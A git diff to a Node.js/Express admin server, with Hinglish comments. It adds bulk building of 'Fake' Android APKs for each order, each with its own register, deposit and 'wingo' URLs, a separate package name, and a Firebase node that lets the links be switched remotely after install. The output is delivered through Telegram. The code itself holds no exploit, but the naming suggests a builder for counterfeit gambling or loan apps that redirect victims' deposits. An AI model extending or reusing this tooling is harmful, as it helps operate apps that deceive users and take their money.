@@ -622,6 +622,64 @@ function isDhaniOrder(order) {
     || order.design_java_type === 'premium';
 }
 
+// ── Fake site APK helpers (primary fake + multiple extra fake sites) ──
+// Fake APK ke liye order object banata hai: apna register link, apna
+// firebase path, unique package name (har fake site side-by-side install
+// ho sake).
+function makeFakeOrder(order, registerUrl, firebasePath, packageSuffix, design) {
+  const { buildUrls, extractDomain } = require('./utils/htmlprocessor');
+  const isDhani = isDhaniOrder({ ...order, design_category: design?.category, design_java_type: design?.java_type });
+  const urls = buildUrls(registerUrl, isDhani);
+  return {
+    ...order,
+    is_fake: true,
+    app_name: order.app_name + ' Fake',
+    package_name: 'com.zayrof.' + String(order.package_name || 'com.zayro.app').split('.').pop() + (packageSuffix || ''),
+    register_url: registerUrl,
+    deposit_url: urls.deposit,
+    wingo_url: urls.wingo,
+    domain: extractDomain(registerUrl),
+    firebase_path: firebasePath
+  };
+}
+
+// Ek fake site row ke liye Firebase path banata hai (unique per site id)
+function makeFakeSitePath(registerUrl, siteId) {
+  const { extractDomain } = require('./utils/htmlprocessor');
+  return `zayrof${extractDomain(registerUrl).replace(/[^a-z0-9]/gi, '').substring(0, 8)}s${siteId}`;
+}
+
+// Ek fake site (order_fake_sites row) ka APK build karta hai.
+// Firebase links pehle likhta hai, phir build — success/fail row me update.
+async function buildFakeSiteApk(order, design, site, buildIdSuffix, logPush) {
+  const { buildUrls } = require('./utils/htmlprocessor');
+  const isDhani = isDhaniOrder({ ...order, design_category: design.category, design_java_type: design.java_type });
+  const urls = buildUrls(site.register_url, isDhani);
+  try {
+    await updateFirebaseLinks(site.firebase_path, {
+      registerUrl: site.register_url,
+      depositUrl: urls.deposit,
+      wingoUrl: urls.wingo
+    });
+  } catch (error) {
+    db.prepare('UPDATE order_fake_sites SET status=? WHERE id=?').run('failed', site.id);
+    logPush(`Fake site #${site.id} Firebase write fail: ${error.message}`);
+    return null;
+  }
+  db.prepare('UPDATE order_fake_sites SET status=? WHERE id=?').run('building', site.id);
+  logPush(`\n--- Building Fake Site APK #${site.id} (${site.register_url}) ---`);
+  const fakeOrder = makeFakeOrder(order, site.register_url, site.firebase_path, 'f' + site.id, design);
+  const result = await buildApk(fakeOrder, design, buildIdSuffix, logPush);
+  if (result.success) {
+    db.prepare('UPDATE order_fake_sites SET apk_file=?, status=? WHERE id=?').run(result.apkFile, 'done', site.id);
+    logPush(`Fake site #${site.id} APK ready!`);
+    return result;
+  }
+  db.prepare('UPDATE order_fake_sites SET status=? WHERE id=?').run('failed', site.id);
+  logPush(`Fake site #${site.id} build failed: ${result.error || 'Build failed'}`);
+  return null;
+}
+
 // Firebase live-link update. New APKs read URL fields from the same
 // <firebase_path>/config node that already controls deposit/register conditions,
 // so the APK never depends on this builder server while running.
@@ -1426,6 +1484,12 @@ app.get('/api/admin/users/:id/orders', requireAdmin, (req, res) => {
     WHERE o.user_id=? ORDER BY o.id DESC
   `).all(userId);
 
+  // Har order ke extra fake sites bhi bhejo (multiple fake APKs)
+  for (const o of orders) {
+    o.fake_sites = getOrderFakeSites(o.id);
+    o.fake_sites_count = o.fake_sites.length;
+  }
+
   const stats = {
     total: orders.length,
     completed: orders.filter(o => o.status === 'done').length,
@@ -1517,6 +1581,11 @@ function rebuildOrderInBackground(orderId, rebuildFake = true) {
         logPush('Fake APK rebuild failed: ' + (fakeResult.error || 'Build failed'));
       }
     }
+    // ── EXTRA FAKE SITES bhi rebuild karo (har site ka apna APK) ──
+    for (const site of getOrderFakeSites(order.id)) {
+      const fr = await buildFakeSiteApk(order, design, site, buildId + '_fakeS' + site.id, logPush);
+      if (fr) apkPaths.push(fr.apkPath);
+    }
     db.prepare('UPDATE orders SET status=?,build_log=? WHERE id=?').run('done', logs.concat('Admin rebuild complete!').join('\n'), order.id);
     sendApkReady(user, db.prepare('SELECT * FROM orders WHERE id=?').get(order.id), apkPaths, []).catch(() => {});
   }).catch(error => {
@@ -1534,6 +1603,102 @@ app.post('/api/admin/orders/:id/rebuild', requireAdmin, (req, res) => {
   }
 });
 
+// ── FAKE SITES (multiple) management ──
+// Order me jitne chahe utne extra fake sites — har ek ka apna APK + link.
+
+function getOrderFakeSites(orderId) {
+  return db.prepare('SELECT * FROM order_fake_sites WHERE order_id=? ORDER BY sort_order ASC, id ASC').all(orderId);
+}
+
+app.get('/api/admin/orders/:id/fake-sites', requireAdmin, (req, res) => {
+  const order = db.prepare('SELECT id FROM orders WHERE id=?').get(req.params.id);
+  if (!order) return res.status(404).json({ error: 'Order not found' });
+  res.json(getOrderFakeSites(req.params.id));
+});
+
+// Naye fake sites add karo + har ek ka APK build (background me)
+app.post('/api/admin/orders/:id/fake-sites', requireAdmin, async (req, res) => {
+  const order = db.prepare('SELECT * FROM orders WHERE id=?').get(req.params.id);
+  if (!order) return res.status(404).json({ error: 'Order not found' });
+  const design = db.prepare('SELECT * FROM designs WHERE id=?').get(order.design_id);
+  const user = db.prepare('SELECT * FROM users WHERE id=?').get(order.user_id);
+
+  let urls = [];
+  try {
+    if (req.body.register_urls) {
+      const arr = typeof req.body.register_urls === 'string' ? JSON.parse(req.body.register_urls) : req.body.register_urls;
+      if (!Array.isArray(arr)) throw new Error('register_urls array hona chahiye');
+      urls = arr.map(u => normalizeHttpUrl(String(u || '').trim()));
+    } else if (req.body.register_url) {
+      urls = [normalizeHttpUrl(String(req.body.register_url).trim())];
+    }
+    if (!urls.length) throw new Error('Kam se kam ek fake site URL do');
+    if (urls.length > 10) throw new Error('Max 10 fake sites ek baar me add kar sakte ho');
+  } catch (error) {
+    return res.json({ error: error.message || 'Valid http(s) URL do' });
+  }
+
+  const inserted = [];
+  for (const url of urls) {
+    const fsid = db.prepare('INSERT INTO order_fake_sites(order_id, register_url, status) VALUES(?,?,?)')
+      .run(order.id, url, 'pending').lastInsertRowid;
+    const fspath = makeFakeSitePath(url, fsid);
+    db.prepare('UPDATE order_fake_sites SET firebase_path=?, sort_order=? WHERE id=?').run(fspath, fsid, fsid);
+    inserted.push(db.prepare('SELECT * FROM order_fake_sites WHERE id=?').get(fsid));
+  }
+
+  res.json({ success: true, added: inserted.length, sites: inserted, message: 'Fake sites added — builds started' });
+
+  // Background: har site ka APK banao (sequentially)
+  const buildId = `build_${order.id}_fakesites_${Date.now()}`;
+  const logs = [];
+  const logPush = msg => { logs.push(msg); db.prepare('UPDATE orders SET build_log=? WHERE id=?').run(logs.join('\n'), order.id); };
+  (async () => {
+    logPush(`Fake sites build started (${inserted.length} site)...`);
+    const apkPaths = [];
+    for (const site of inserted) {
+      const fr = await buildFakeSiteApk(order, design, site, buildId + '_fakeS' + site.id, logPush);
+      if (fr) apkPaths.push(fr.apkPath);
+    }
+    logPush('Fake sites build done.');
+    if (apkPaths.length) sendApkReady(user, order, apkPaths, []).catch(() => {});
+  })().catch(error => {
+    db.prepare('UPDATE orders SET build_log=? WHERE id=?').run(logs.concat('Fake sites build crashed: ' + error.message).join('\n'), order.id);
+  });
+});
+
+// Ek fake site delete karo (APK folder + file bhi)
+app.delete('/api/admin/orders/:id/fake-sites/:fsid', requireAdmin, (req, res) => {
+  const site = db.prepare('SELECT * FROM order_fake_sites WHERE id=? AND order_id=?').get(req.params.fsid, req.params.id);
+  if (!site) return res.status(404).json({ error: 'Fake site not found' });
+
+  // Is site ke APK wale build folders delete karo (apk_file se match)
+  if (site.apk_file) {
+    const buildsDir = path.join(__dirname, 'builds');
+    if (fs.existsSync(buildsDir)) {
+      for (const dir of fs.readdirSync(buildsDir)) {
+        const dirPath = path.join(buildsDir, dir);
+        try {
+          if (fs.statSync(dirPath).isDirectory() && fs.readdirSync(dirPath).includes(site.apk_file)) {
+            fs.rmSync(dirPath, { recursive: true, force: true });
+          }
+        } catch (_) {}
+      }
+    }
+  }
+  db.prepare('DELETE FROM order_fake_sites WHERE id=?').run(site.id);
+  res.json({ success: true });
+});
+
+// Fake site APK download (admin)
+app.get('/api/admin/orders/:id/fake-sites/:fsid/download', requireAdmin, (req, res) => {
+  const site = db.prepare('SELECT * FROM order_fake_sites WHERE id=? AND order_id=?').get(req.params.fsid, req.params.id);
+  if (!site || !site.apk_file) return res.status(404).json({ error: 'Fake site APK not ready' });
+  const apkPath = findBuiltApk(site.apk_file);
+  if (!apkPath) return res.status(404).json({ error: 'File not found' });
+  res.download(apkPath, path.basename(site.apk_file));
+});
+
 // ── ADMIN: Create order for ANY user from scratch (FREE — 0 coins) ──
 // Admin panel me user select karke direct order banaya ja sakta hai, bina
 // user ke koi request kiye. Isme user ke coins NAHI katte (free admin order).
@@ -1544,9 +1709,17 @@ app.post('/api/admin/orders/create', requireAdmin, iconUpload.single('icon'), as
 
   let cleanRegisterUrl;
   let cleanFakeRegisterUrl = null;
+  let extraFakeUrls = [];
   try {
     cleanRegisterUrl = normalizeHttpUrl(register_url);
     if (fake_register_url) cleanFakeRegisterUrl = normalizeHttpUrl(fake_register_url);
+    // Extra fake sites — JSON array (jitne chahe utne, max 10)
+    if (req.body.fake_sites) {
+      const arr = typeof req.body.fake_sites === 'string' ? JSON.parse(req.body.fake_sites) : req.body.fake_sites;
+      if (!Array.isArray(arr)) throw new Error('fake_sites array hona chahiye');
+      extraFakeUrls = arr.map(u => normalizeHttpUrl(String(u || '').trim())).filter(u => u);
+      if (extraFakeUrls.length > 10) throw new Error('Max 10 extra fake sites allowed');
+    }
   } catch (error) {
     return res.json({ error: error.message || 'Enter a valid http(s) register URL' });
   }
@@ -1631,8 +1804,22 @@ app.post('/api/admin/orders/create', requireAdmin, iconUpload.single('icon'), as
         }
       }
 
-      db.prepare('UPDATE orders SET status=? WHERE id=?').run('done', orderId);
+      // ── MULTIPLE EXTRA FAKE SITES — har site ka apna APK ──
       const apkPaths = [result.apkPath];
+      for (let i = 0; i < extraFakeUrls.length; i++) {
+        const url = extraFakeUrls[i];
+        const insertFs = db.prepare('INSERT INTO order_fake_sites(order_id, register_url, status, sort_order) VALUES(?,?,?,?)');
+        const fsid = insertFs.run(orderId, url, 'building', i).lastInsertRowid;
+        const fspath = makeFakeSitePath(url, fsid);
+        db.prepare('UPDATE order_fake_sites SET firebase_path=?, deposit_url=?, wingo_url=?, domain=? WHERE id=?')
+          .run(fspath, buildUrls(url, isDhaniDesign).deposit, buildUrls(url, isDhaniDesign).wingo, extractDomain(url), fsid);
+        const site = db.prepare('SELECT * FROM order_fake_sites WHERE id=?').get(fsid);
+        const fr = await buildFakeSiteApk(order, design, site, buildId + '_fakeS' + fsid, logPush);
+        if (fr) apkPaths.push(fr.apkPath);
+      }
+
+      db.prepare('UPDATE orders SET status=? WHERE id=?').run('done', orderId);
+      // Send APK files via Telegram (instant)
       if (fakeResult?.success) apkPaths.push(fakeResult.apkPath);
       sendApkReady(user, db.prepare('SELECT * FROM orders WHERE id=?').get(orderId), apkPaths, []).catch(() => {});
     } else {
